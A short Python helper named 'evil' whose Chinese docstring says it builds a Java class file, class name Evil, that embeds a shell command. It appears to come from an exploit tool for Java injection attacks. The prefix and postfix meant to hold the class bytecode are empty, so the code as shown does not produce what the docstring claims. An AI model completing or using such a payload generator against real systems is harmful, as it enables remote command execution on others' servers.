def evil(cmd: str) -> bytes:
    """
    返回一个包含了cmd指令的class文件，内嵌的类名称是Evil
    """
    prefix = ""
    postfix = ""
    length = len(cmd).to_bytes(2, byteorder='big').hex()
    hexdata = prefix + length + cmd.encode().hex() + postfix
    data = bytes.fromhex(hexdata)
    return data